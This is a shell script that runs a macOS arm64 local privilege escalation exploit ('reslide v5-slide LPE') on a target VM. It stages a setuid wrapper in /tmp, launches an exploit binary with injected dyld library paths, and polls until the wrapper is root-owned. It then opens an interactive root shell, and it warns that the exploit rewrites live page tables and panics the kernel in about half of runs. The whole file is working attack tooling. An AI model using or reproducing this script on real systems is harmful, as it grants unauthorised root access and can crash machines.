#!/bin/sh
# run-on-guest.sh — run this ON the target macOS arm64 VM as a normal (unprivileged) user.
# No build, no install path, no SSH/credentials needed: copy this directory anywhere and run it.
# It targets YOUR uid automatically (any user, not just 501) and, on success, drops you into an
# interactive root shell.
set -u
DIR="$(cd "$(dirname "$0")" 2>/dev/null && pwd)"
cd "$DIR" || { echo "cannot cd to script dir"; exit 1; }
CACHE=/System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e
WRAP=/tmp/lpe_suidwrap      # fixed path the payload arms; uid- and install-dir-agnostic
LOG="$DIR/run.log"          # persistent (survives a post-success panic, unlike /tmp)

echo "=============================================================="
echo "  reslide v5-slide LPE  -  unprivileged -> root  (release)"
echo "=============================================================="
echo "[*] caller : $(id)"
echo "[*] devmode: $(DevToolsSecurity -status 2>&1)   (NOT required)"
echo "[*] kernel : $(uname -v 2>/dev/null | sed 's/.*root://')"
echo

# Re-use an already-armed wrapper from a prior success this session (no exploit, no crash).
if [ -u "$WRAP" ] && [ "$(stat -f %u "$WRAP" 2>/dev/null)" = 0 ]; then
  echo "[+] $WRAP already setuid-root -> popping root, no exploit."
  POP_INTERACTIVE=1 "$WRAP"; exit 0
fi

# Stage the wrapper at the fixed path the payload chown+chmods on success.
cp "$DIR/suidwrap" "$WRAP" 2>/dev/null && chmod 0755 "$WRAP" || { echo "cannot stage $WRAP"; exit 1; }

echo "[*] firing exploit (targets your uid=$(id -u)). Live output incl. the physical scan follows."
echo "    NOTE: the scan rewrites live PTEs and can panic the kernel (~50% of runs)."
echo "          On a panic the VM reboots itself; just run this script again."
echo "--------------------------------------------------------------"
CHILD_DYLD_SHARED_CACHE_DIR=/tmp/does-not-exist CHILD_DYLD_LIBRARY_PATH="$DIR/fakelib" \
  ./reslide_launcher ./reslide_child "$CACHE" 2>&1 | tee "$LOG" &
for i in $(seq 1 220); do
  [ -u "$WRAP" ] && [ "$(stat -f %u "$WRAP" 2>/dev/null)" = 0 ] && break
  grep -q "536 ret=0x0000000000000016" "$LOG" 2>/dev/null && {
    echo; echo "[-] 536 = already-mapped: region not fresh. 'sudo reboot' then re-run."; exit 1; }
  sleep 1
done
echo "--------------------------------------------------------------"

if [ -u "$WRAP" ] && [ "$(stat -f %u "$WRAP" 2>/dev/null)" = 0 ]; then
  echo "[+] ROOT reached (see 'oracle post getuid=0x0' above). Dropping to root shell:"
  POP_INTERACTIVE=1 "$WRAP"
  rm -f "$WRAP"      # remove the setuid helper afterward
  echo "[*] proof transcript saved (persists across reboot): $LOG"
else
  echo "[-] no root this run (clean miss, or it panicked mid-scan). Just run it again"
  echo "    (reboot first only if the VM panicked / it says already-mapped)."
  rm -f "$WRAP"
fi
